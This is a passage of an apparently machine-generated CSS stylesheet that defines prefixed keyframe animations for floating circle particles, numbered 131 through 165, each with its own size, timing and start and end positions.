            transform: translate3d(87vw, -112vh, 0);
  }
}
.circle-container:nth-child(131) .circle {
  -webkit-animation-delay: 1505ms;
          animation-delay: 1505ms;
}
.circle-container:nth-child(132) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-132;
          animation-name: move-frames-132;
  -webkit-animation-duration: 33832ms;
          animation-duration: 33832ms;
  -webkit-animation-delay: 34581ms;
          animation-delay: 34581ms;
}
@-webkit-keyframes move-frames-132 {
  from {
    -webkit-transform: translate3d(36vw, 106vh, 0);
            transform: translate3d(36vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -108vh, 0);
            transform: translate3d(98vw, -108vh, 0);
  }
}
@keyframes move-frames-132 {
  from {
    -webkit-transform: translate3d(36vw, 106vh, 0);
            transform: translate3d(36vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -108vh, 0);
            transform: translate3d(98vw, -108vh, 0);
  }
}
.circle-container:nth-child(132) .circle {
  -webkit-animation-delay: 1039ms;
          animation-delay: 1039ms;
}
.circle-container:nth-child(133) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-133;
          animation-name: move-frames-133;
  -webkit-animation-duration: 28533ms;
          animation-duration: 28533ms;
  -webkit-animation-delay: 15849ms;
          animation-delay: 15849ms;
}
@-webkit-keyframes move-frames-133 {
  from {
    -webkit-transform: translate3d(60vw, 109vh, 0);
            transform: translate3d(60vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -137vh, 0);
            transform: translate3d(37vw, -137vh, 0);
  }
}
@keyframes move-frames-133 {
  from {
    -webkit-transform: translate3d(60vw, 109vh, 0);
            transform: translate3d(60vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -137vh, 0);
            transform: translate3d(37vw, -137vh, 0);
  }
}
.circle-container:nth-child(133) .circle {
  -webkit-animation-delay: 637ms;
          animation-delay: 637ms;
}
.circle-container:nth-child(134) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-134;
          animation-name: move-frames-134;
  -webkit-animation-duration: 33530ms;
          animation-duration: 33530ms;
  -webkit-animation-delay: 28078ms;
          animation-delay: 28078ms;
}
@-webkit-keyframes move-frames-134 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(7vw, -108vh, 0);
            transform: translate3d(7vw, -108vh, 0);
  }
}
@keyframes move-frames-134 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(7vw, -108vh, 0);
            transform: translate3d(7vw, -108vh, 0);
  }
}
.circle-container:nth-child(134) .circle {
  -webkit-animation-delay: 1510ms;
          animation-delay: 1510ms;
}
.circle-container:nth-child(135) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-135;
          animation-name: move-frames-135;
  -webkit-animation-duration: 34493ms;
          animation-duration: 34493ms;
  -webkit-animation-delay: 32057ms;
          animation-delay: 32057ms;
}
@-webkit-keyframes move-frames-135 {
  from {
    -webkit-transform: translate3d(98vw, 109vh, 0);
            transform: translate3d(98vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -113vh, 0);
            transform: translate3d(45vw, -113vh, 0);
  }
}
@keyframes move-frames-135 {
  from {
    -webkit-transform: translate3d(98vw, 109vh, 0);
            transform: translate3d(98vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(45vw, -113vh, 0);
            transform: translate3d(45vw, -113vh, 0);
  }
}
.circle-container:nth-child(135) .circle {
  -webkit-animation-delay: 2067ms;
          animation-delay: 2067ms;
}
.circle-container:nth-child(136) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-136;
          animation-name: move-frames-136;
  -webkit-animation-duration: 29276ms;
          animation-duration: 29276ms;
  -webkit-animation-delay: 1732ms;
          animation-delay: 1732ms;
}
@-webkit-keyframes move-frames-136 {
  from {
    -webkit-transform: translate3d(56vw, 103vh, 0);
            transform: translate3d(56vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(39vw, -107vh, 0);
            transform: translate3d(39vw, -107vh, 0);
  }
}
@keyframes move-frames-136 {
  from {
    -webkit-transform: translate3d(56vw, 103vh, 0);
            transform: translate3d(56vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(39vw, -107vh, 0);
            transform: translate3d(39vw, -107vh, 0);
  }
}
.circle-container:nth-child(136) .circle {
  -webkit-animation-delay: 20ms;
          animation-delay: 20ms;
}
.circle-container:nth-child(137) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-137;
          animation-name: move-frames-137;
  -webkit-animation-duration: 30945ms;
          animation-duration: 30945ms;
  -webkit-animation-delay: 2417ms;
          animation-delay: 2417ms;
}
@-webkit-keyframes move-frames-137 {
  from {
    -webkit-transform: translate3d(29vw, 104vh, 0);
            transform: translate3d(29vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -116vh, 0);
            transform: translate3d(80vw, -116vh, 0);
  }
}
@keyframes move-frames-137 {
  from {
    -webkit-transform: translate3d(29vw, 104vh, 0);
            transform: translate3d(29vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -116vh, 0);
            transform: translate3d(80vw, -116vh, 0);
  }
}
.circle-container:nth-child(137) .circle {
  -webkit-animation-delay: 1174ms;
          animation-delay: 1174ms;
}
.circle-container:nth-child(138) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-138;
          animation-name: move-frames-138;
  -webkit-animation-duration: 36608ms;
          animation-duration: 36608ms;
  -webkit-animation-delay: 7115ms;
          animation-delay: 7115ms;
}
@-webkit-keyframes move-frames-138 {
  from {
    -webkit-transform: translate3d(10vw, 110vh, 0);
            transform: translate3d(10vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -124vh, 0);
            transform: translate3d(24vw, -124vh, 0);
  }
}
@keyframes move-frames-138 {
  from {
    -webkit-transform: translate3d(10vw, 110vh, 0);
            transform: translate3d(10vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -124vh, 0);
            transform: translate3d(24vw, -124vh, 0);
  }
}
.circle-container:nth-child(138) .circle {
  -webkit-animation-delay: 343ms;
          animation-delay: 343ms;
}
.circle-container:nth-child(139) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-139;
          animation-name: move-frames-139;
  -webkit-animation-duration: 28929ms;
          animation-duration: 28929ms;
  -webkit-animation-delay: 1365ms;
          animation-delay: 1365ms;
}
@-webkit-keyframes move-frames-139 {
  from {
    -webkit-transform: translate3d(13vw, 107vh, 0);
            transform: translate3d(13vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -121vh, 0);
            transform: translate3d(30vw, -121vh, 0);
  }
}
@keyframes move-frames-139 {
  from {
    -webkit-transform: translate3d(13vw, 107vh, 0);
            transform: translate3d(13vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -121vh, 0);
            transform: translate3d(30vw, -121vh, 0);
  }
}
.circle-container:nth-child(139) .circle {
  -webkit-animation-delay: 3180ms;
          animation-delay: 3180ms;
}
.circle-container:nth-child(140) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-140;
          animation-name: move-frames-140;
  -webkit-animation-duration: 32463ms;
          animation-duration: 32463ms;
  -webkit-animation-delay: 23773ms;
          animation-delay: 23773ms;
}
@-webkit-keyframes move-frames-140 {
  from {
    -webkit-transform: translate3d(7vw, 107vh, 0);
            transform: translate3d(7vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(33vw, -119vh, 0);
            transform: translate3d(33vw, -119vh, 0);
  }
}
@keyframes move-frames-140 {
  from {
    -webkit-transform: translate3d(7vw, 107vh, 0);
            transform: translate3d(7vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(33vw, -119vh, 0);
            transform: translate3d(33vw, -119vh, 0);
  }
}
.circle-container:nth-child(140) .circle {
  -webkit-animation-delay: 2729ms;
          animation-delay: 2729ms;
}
.circle-container:nth-child(141) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-141;
          animation-name: move-frames-141;
  -webkit-animation-duration: 36502ms;
          animation-duration: 36502ms;
  -webkit-animation-delay: 10912ms;
          animation-delay: 10912ms;
}
@-webkit-keyframes move-frames-141 {
  from {
    -webkit-transform: translate3d(28vw, 104vh, 0);
            transform: translate3d(28vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -112vh, 0);
            transform: translate3d(81vw, -112vh, 0);
  }
}
@keyframes move-frames-141 {
  from {
    -webkit-transform: translate3d(28vw, 104vh, 0);
            transform: translate3d(28vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -112vh, 0);
            transform: translate3d(81vw, -112vh, 0);
  }
}
.circle-container:nth-child(141) .circle {
  -webkit-animation-delay: 3629ms;
          animation-delay: 3629ms;
}
.circle-container:nth-child(142) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-142;
          animation-name: move-frames-142;
  -webkit-animation-duration: 31483ms;
          animation-duration: 31483ms;
  -webkit-animation-delay: 26974ms;
          animation-delay: 26974ms;
}
@-webkit-keyframes move-frames-142 {
  from {
    -webkit-transform: translate3d(63vw, 102vh, 0);
            transform: translate3d(63vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(93vw, -127vh, 0);
            transform: translate3d(93vw, -127vh, 0);
  }
}
@keyframes move-frames-142 {
  from {
    -webkit-transform: translate3d(63vw, 102vh, 0);
            transform: translate3d(63vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(93vw, -127vh, 0);
            transform: translate3d(93vw, -127vh, 0);
  }
}
.circle-container:nth-child(142) .circle {
  -webkit-animation-delay: 1249ms;
          animation-delay: 1249ms;
}
.circle-container:nth-child(143) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-143;
          animation-name: move-frames-143;
  -webkit-animation-duration: 30877ms;
          animation-duration: 30877ms;
  -webkit-animation-delay: 12622ms;
          animation-delay: 12622ms;
}
@-webkit-keyframes move-frames-143 {
  from {
    -webkit-transform: translate3d(22vw, 104vh, 0);
            transform: translate3d(22vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(46vw, -123vh, 0);
            transform: translate3d(46vw, -123vh, 0);
  }
}
@keyframes move-frames-143 {
  from {
    -webkit-transform: translate3d(22vw, 104vh, 0);
            transform: translate3d(22vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(46vw, -123vh, 0);
            transform: translate3d(46vw, -123vh, 0);
  }
}
.circle-container:nth-child(143) .circle {
  -webkit-animation-delay: 2851ms;
          animation-delay: 2851ms;
}
.circle-container:nth-child(144) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-144;
          animation-name: move-frames-144;
  -webkit-animation-duration: 29395ms;
          animation-duration: 29395ms;
  -webkit-animation-delay: 14451ms;
          animation-delay: 14451ms;
}
@-webkit-keyframes move-frames-144 {
  from {
    -webkit-transform: translate3d(83vw, 101vh, 0);
            transform: translate3d(83vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(66vw, -115vh, 0);
            transform: translate3d(66vw, -115vh, 0);
  }
}
@keyframes move-frames-144 {
  from {
    -webkit-transform: translate3d(83vw, 101vh, 0);
            transform: translate3d(83vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(66vw, -115vh, 0);
            transform: translate3d(66vw, -115vh, 0);
  }
}
.circle-container:nth-child(144) .circle {
  -webkit-animation-delay: 2659ms;
          animation-delay: 2659ms;
}
.circle-container:nth-child(145) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-145;
          animation-name: move-frames-145;
  -webkit-animation-duration: 28217ms;
          animation-duration: 28217ms;
  -webkit-animation-delay: 1751ms;
          animation-delay: 1751ms;
}
@-webkit-keyframes move-frames-145 {
  from {
    -webkit-transform: translate3d(51vw, 109vh, 0);
            transform: translate3d(51vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(83vw, -119vh, 0);
            transform: translate3d(83vw, -119vh, 0);
  }
}
@keyframes move-frames-145 {
  from {
    -webkit-transform: translate3d(51vw, 109vh, 0);
            transform: translate3d(51vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(83vw, -119vh, 0);
            transform: translate3d(83vw, -119vh, 0);
  }
}
.circle-container:nth-child(145) .circle {
  -webkit-animation-delay: 2661ms;
          animation-delay: 2661ms;
}
.circle-container:nth-child(146) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-146;
          animation-name: move-frames-146;
  -webkit-animation-duration: 31376ms;
          animation-duration: 31376ms;
  -webkit-animation-delay: 14584ms;
          animation-delay: 14584ms;
}
@-webkit-keyframes move-frames-146 {
  from {
    -webkit-transform: translate3d(2vw, 108vh, 0);
            transform: translate3d(2vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -110vh, 0);
            transform: translate3d(37vw, -110vh, 0);
  }
}
@keyframes move-frames-146 {
  from {
    -webkit-transform: translate3d(2vw, 108vh, 0);
            transform: translate3d(2vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -110vh, 0);
            transform: translate3d(37vw, -110vh, 0);
  }
}
.circle-container:nth-child(146) .circle {
  -webkit-animation-delay: 1092ms;
          animation-delay: 1092ms;
}
.circle-container:nth-child(147) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-147;
          animation-name: move-frames-147;
  -webkit-animation-duration: 32006ms;
          animation-duration: 32006ms;
  -webkit-animation-delay: 34183ms;
          animation-delay: 34183ms;
}
@-webkit-keyframes move-frames-147 {
  from {
    -webkit-transform: translate3d(71vw, 104vh, 0);
            transform: translate3d(71vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -134vh, 0);
            transform: translate3d(94vw, -134vh, 0);
  }
}
@keyframes move-frames-147 {
  from {
    -webkit-transform: translate3d(71vw, 104vh, 0);
            transform: translate3d(71vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -134vh, 0);
            transform: translate3d(94vw, -134vh, 0);
  }
}
.circle-container:nth-child(147) .circle {
  -webkit-animation-delay: 1743ms;
          animation-delay: 1743ms;
}
.circle-container:nth-child(148) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-148;
          animation-name: move-frames-148;
  -webkit-animation-duration: 29307ms;
          animation-duration: 29307ms;
  -webkit-animation-delay: 22873ms;
          animation-delay: 22873ms;
}
@-webkit-keyframes move-frames-148 {
  from {
    -webkit-transform: translate3d(69vw, 102vh, 0);
            transform: translate3d(69vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -128vh, 0);
            transform: translate3d(17vw, -128vh, 0);
  }
}
@keyframes move-frames-148 {
  from {
    -webkit-transform: translate3d(69vw, 102vh, 0);
            transform: translate3d(69vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -128vh, 0);
            transform: translate3d(17vw, -128vh, 0);
  }
}
.circle-container:nth-child(148) .circle {
  -webkit-animation-delay: 352ms;
          animation-delay: 352ms;
}
.circle-container:nth-child(149) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-149;
          animation-name: move-frames-149;
  -webkit-animation-duration: 30619ms;
          animation-duration: 30619ms;
  -webkit-animation-delay: 4400ms;
          animation-delay: 4400ms;
}
@-webkit-keyframes move-frames-149 {
  from {
    -webkit-transform: translate3d(32vw, 104vh, 0);
            transform: translate3d(32vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -108vh, 0);
            transform: translate3d(52vw, -108vh, 0);
  }
}
@keyframes move-frames-149 {
  from {
    -webkit-transform: translate3d(32vw, 104vh, 0);
            transform: translate3d(32vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -108vh, 0);
            transform: translate3d(52vw, -108vh, 0);
  }
}
.circle-container:nth-child(149) .circle {
  -webkit-animation-delay: 995ms;
          animation-delay: 995ms;
}
.circle-container:nth-child(150) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-150;
          animation-name: move-frames-150;
  -webkit-animation-duration: 35961ms;
          animation-duration: 35961ms;
  -webkit-animation-delay: 6368ms;
          animation-delay: 6368ms;
}
@-webkit-keyframes move-frames-150 {
  from {
    -webkit-transform: translate3d(59vw, 103vh, 0);
            transform: translate3d(59vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -112vh, 0);
            transform: translate3d(3vw, -112vh, 0);
  }
}
@keyframes move-frames-150 {
  from {
    -webkit-transform: translate3d(59vw, 103vh, 0);
            transform: translate3d(59vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -112vh, 0);
            transform: translate3d(3vw, -112vh, 0);
  }
}
.circle-container:nth-child(150) .circle {
  -webkit-animation-delay: 3729ms;
          animation-delay: 3729ms;
}
.circle-container:nth-child(151) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-151;
          animation-name: move-frames-151;
  -webkit-animation-duration: 28874ms;
          animation-duration: 28874ms;
  -webkit-animation-delay: 19807ms;
          animation-delay: 19807ms;
}
@-webkit-keyframes move-frames-151 {
  from {
    -webkit-transform: translate3d(77vw, 110vh, 0);
            transform: translate3d(77vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -112vh, 0);
            transform: translate3d(30vw, -112vh, 0);
  }
}
@keyframes move-frames-151 {
  from {
    -webkit-transform: translate3d(77vw, 110vh, 0);
            transform: translate3d(77vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -112vh, 0);
            transform: translate3d(30vw, -112vh, 0);
  }
}
.circle-container:nth-child(151) .circle {
  -webkit-animation-delay: 2850ms;
          animation-delay: 2850ms;
}
.circle-container:nth-child(152) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-152;
          animation-name: move-frames-152;
  -webkit-animation-duration: 30811ms;
          animation-duration: 30811ms;
  -webkit-animation-delay: 3382ms;
          animation-delay: 3382ms;
}
@-webkit-keyframes move-frames-152 {
  from {
    -webkit-transform: translate3d(23vw, 103vh, 0);
            transform: translate3d(23vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(35vw, -110vh, 0);
            transform: translate3d(35vw, -110vh, 0);
  }
}
@keyframes move-frames-152 {
  from {
    -webkit-transform: translate3d(23vw, 103vh, 0);
            transform: translate3d(23vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(35vw, -110vh, 0);
            transform: translate3d(35vw, -110vh, 0);
  }
}
.circle-container:nth-child(152) .circle {
  -webkit-animation-delay: 1624ms;
          animation-delay: 1624ms;
}
.circle-container:nth-child(153) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-153;
          animation-name: move-frames-153;
  -webkit-animation-duration: 29295ms;
          animation-duration: 29295ms;
  -webkit-animation-delay: 18173ms;
          animation-delay: 18173ms;
}
@-webkit-keyframes move-frames-153 {
  from {
    -webkit-transform: translate3d(15vw, 103vh, 0);
            transform: translate3d(15vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(47vw, -132vh, 0);
            transform: translate3d(47vw, -132vh, 0);
  }
}
@keyframes move-frames-153 {
  from {
    -webkit-transform: translate3d(15vw, 103vh, 0);
            transform: translate3d(15vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(47vw, -132vh, 0);
            transform: translate3d(47vw, -132vh, 0);
  }
}
.circle-container:nth-child(153) .circle {
  -webkit-animation-delay: 3550ms;
          animation-delay: 3550ms;
}
.circle-container:nth-child(154) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-154;
          animation-name: move-frames-154;
  -webkit-animation-duration: 29026ms;
          animation-duration: 29026ms;
  -webkit-animation-delay: 4855ms;
          animation-delay: 4855ms;
}
@-webkit-keyframes move-frames-154 {
  from {
    -webkit-transform: translate3d(26vw, 102vh, 0);
            transform: translate3d(26vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(91vw, -113vh, 0);
            transform: translate3d(91vw, -113vh, 0);
  }
}
@keyframes move-frames-154 {
  from {
    -webkit-transform: translate3d(26vw, 102vh, 0);
            transform: translate3d(26vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(91vw, -113vh, 0);
            transform: translate3d(91vw, -113vh, 0);
  }
}
.circle-container:nth-child(154) .circle {
  -webkit-animation-delay: 3459ms;
          animation-delay: 3459ms;
}
.circle-container:nth-child(155) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-155;
          animation-name: move-frames-155;
  -webkit-animation-duration: 34418ms;
          animation-duration: 34418ms;
  -webkit-animation-delay: 24130ms;
          animation-delay: 24130ms;
}
@-webkit-keyframes move-frames-155 {
  from {
    -webkit-transform: translate3d(59vw, 102vh, 0);
            transform: translate3d(59vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -126vh, 0);
            transform: translate3d(60vw, -126vh, 0);
  }
}
@keyframes move-frames-155 {
  from {
    -webkit-transform: translate3d(59vw, 102vh, 0);
            transform: translate3d(59vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -126vh, 0);
            transform: translate3d(60vw, -126vh, 0);
  }
}
.circle-container:nth-child(155) .circle {
  -webkit-animation-delay: 244ms;
          animation-delay: 244ms;
}
.circle-container:nth-child(156) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-156;
          animation-name: move-frames-156;
  -webkit-animation-duration: 36640ms;
          animation-duration: 36640ms;
  -webkit-animation-delay: 12412ms;
          animation-delay: 12412ms;
}
@-webkit-keyframes move-frames-156 {
  from {
    -webkit-transform: translate3d(81vw, 102vh, 0);
            transform: translate3d(81vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(53vw, -123vh, 0);
            transform: translate3d(53vw, -123vh, 0);
  }
}
@keyframes move-frames-156 {
  from {
    -webkit-transform: translate3d(81vw, 102vh, 0);
            transform: translate3d(81vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(53vw, -123vh, 0);
            transform: translate3d(53vw, -123vh, 0);
  }
}
.circle-container:nth-child(156) .circle {
  -webkit-animation-delay: 2909ms;
          animation-delay: 2909ms;
}
.circle-container:nth-child(157) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-157;
          animation-name: move-frames-157;
  -webkit-animation-duration: 28380ms;
          animation-duration: 28380ms;
  -webkit-animation-delay: 7209ms;
          animation-delay: 7209ms;
}
@-webkit-keyframes move-frames-157 {
  from {
    -webkit-transform: translate3d(33vw, 107vh, 0);
            transform: translate3d(33vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -108vh, 0);
            transform: translate3d(18vw, -108vh, 0);
  }
}
@keyframes move-frames-157 {
  from {
    -webkit-transform: translate3d(33vw, 107vh, 0);
            transform: translate3d(33vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -108vh, 0);
            transform: translate3d(18vw, -108vh, 0);
  }
}
.circle-container:nth-child(157) .circle {
  -webkit-animation-delay: 840ms;
          animation-delay: 840ms;
}
.circle-container:nth-child(158) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-158;
          animation-name: move-frames-158;
  -webkit-animation-duration: 31809ms;
          animation-duration: 31809ms;
  -webkit-animation-delay: 3448ms;
          animation-delay: 3448ms;
}
@-webkit-keyframes move-frames-158 {
  from {
    -webkit-transform: translate3d(81vw, 106vh, 0);
            transform: translate3d(81vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -113vh, 0);
            transform: translate3d(99vw, -113vh, 0);
  }
}
@keyframes move-frames-158 {
  from {
    -webkit-transform: translate3d(81vw, 106vh, 0);
            transform: translate3d(81vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -113vh, 0);
            transform: translate3d(99vw, -113vh, 0);
  }
}
.circle-container:nth-child(158) .circle {
  -webkit-animation-delay: 226ms;
          animation-delay: 226ms;
}
.circle-container:nth-child(159) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-159;
          animation-name: move-frames-159;
  -webkit-animation-duration: 35051ms;
          animation-duration: 35051ms;
  -webkit-animation-delay: 9729ms;
          animation-delay: 9729ms;
}
@-webkit-keyframes move-frames-159 {
  from {
    -webkit-transform: translate3d(68vw, 103vh, 0);
            transform: translate3d(68vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(5vw, -119vh, 0);
            transform: translate3d(5vw, -119vh, 0);
  }
}
@keyframes move-frames-159 {
  from {
    -webkit-transform: translate3d(68vw, 103vh, 0);
            transform: translate3d(68vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(5vw, -119vh, 0);
            transform: translate3d(5vw, -119vh, 0);
  }
}
.circle-container:nth-child(159) .circle {
  -webkit-animation-delay: 3882ms;
          animation-delay: 3882ms;
}
.circle-container:nth-child(160) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-160;
          animation-name: move-frames-160;
  -webkit-animation-duration: 34338ms;
          animation-duration: 34338ms;
  -webkit-animation-delay: 3682ms;
          animation-delay: 3682ms;
}
@-webkit-keyframes move-frames-160 {
  from {
    -webkit-transform: translate3d(96vw, 105vh, 0);
            transform: translate3d(96vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -133vh, 0);
            transform: translate3d(50vw, -133vh, 0);
  }
}
@keyframes move-frames-160 {
  from {
    -webkit-transform: translate3d(96vw, 105vh, 0);
            transform: translate3d(96vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -133vh, 0);
            transform: translate3d(50vw, -133vh, 0);
  }
}
.circle-container:nth-child(160) .circle {
  -webkit-animation-delay: 1268ms;
          animation-delay: 1268ms;
}
.circle-container:nth-child(161) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-161;
          animation-name: move-frames-161;
  -webkit-animation-duration: 28531ms;
          animation-duration: 28531ms;
  -webkit-animation-delay: 22559ms;
          animation-delay: 22559ms;
}
@-webkit-keyframes move-frames-161 {
  from {
    -webkit-transform: translate3d(75vw, 107vh, 0);
            transform: translate3d(75vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -133vh, 0);
            transform: translate3d(99vw, -133vh, 0);
  }
}
@keyframes move-frames-161 {
  from {
    -webkit-transform: translate3d(75vw, 107vh, 0);
            transform: translate3d(75vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -133vh, 0);
            transform: translate3d(99vw, -133vh, 0);
  }
}
.circle-container:nth-child(161) .circle {
  -webkit-animation-delay: 2402ms;
          animation-delay: 2402ms;
}
.circle-container:nth-child(162) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-162;
          animation-name: move-frames-162;
  -webkit-animation-duration: 28073ms;
          animation-duration: 28073ms;
  -webkit-animation-delay: 15289ms;
          animation-delay: 15289ms;
}
@-webkit-keyframes move-frames-162 {
  from {
    -webkit-transform: translate3d(15vw, 102vh, 0);
            transform: translate3d(15vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(5vw, -107vh, 0);
            transform: translate3d(5vw, -107vh, 0);
  }
}
@keyframes move-frames-162 {
  from {
    -webkit-transform: translate3d(15vw, 102vh, 0);
            transform: translate3d(15vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(5vw, -107vh, 0);
            transform: translate3d(5vw, -107vh, 0);
  }
}
.circle-container:nth-child(162) .circle {
  -webkit-animation-delay: 3067ms;
          animation-delay: 3067ms;
}
.circle-container:nth-child(163) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-163;
          animation-name: move-frames-163;
  -webkit-animation-duration: 35450ms;
          animation-duration: 35450ms;
  -webkit-animation-delay: 2529ms;
          animation-delay: 2529ms;
}
@-webkit-keyframes move-frames-163 {
  from {
    -webkit-transform: translate3d(7vw, 104vh, 0);
            transform: translate3d(7vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(12vw, -112vh, 0);
            transform: translate3d(12vw, -112vh, 0);
  }
}
@keyframes move-frames-163 {
  from {
    -webkit-transform: translate3d(7vw, 104vh, 0);
            transform: translate3d(7vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(12vw, -112vh, 0);
            transform: translate3d(12vw, -112vh, 0);
  }
}
.circle-container:nth-child(163) .circle {
  -webkit-animation-delay: 1454ms;
          animation-delay: 1454ms;
}
.circle-container:nth-child(164) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-164;
          animation-name: move-frames-164;
  -webkit-animation-duration: 34415ms;
          animation-duration: 34415ms;
  -webkit-animation-delay: 17292ms;
          animation-delay: 17292ms;
}
@-webkit-keyframes move-frames-164 {
  from {
    -webkit-transform: translate3d(39vw, 102vh, 0);
            transform: translate3d(39vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -105vh, 0);
            transform: translate3d(38vw, -105vh, 0);
  }
}
@keyframes move-frames-164 {
  from {
    -webkit-transform: translate3d(39vw, 102vh, 0);
            transform: translate3d(39vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -105vh, 0);
            transform: translate3d(38vw, -105vh, 0);
  }
}
.circle-container:nth-child(164) .circle {
  -webkit-animation-delay: 3132ms;
          animation-delay: 3132ms;
}
.circle-container:nth-child(165) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-165;
          animation-name: move-frames-165;
  -webkit-animation-duration: 31932ms;
          animation-duration: 31932ms;
  -webkit-animation-delay: 24001ms;
          animation-delay: 24001ms;
}
@-webkit-keyframes move-frames-165 {
  from {
    -webkit-transform: translate3d(75vw, 107vh, 0);
            transform: translate3d(75vw, 107vh, 0);
  }
  to {
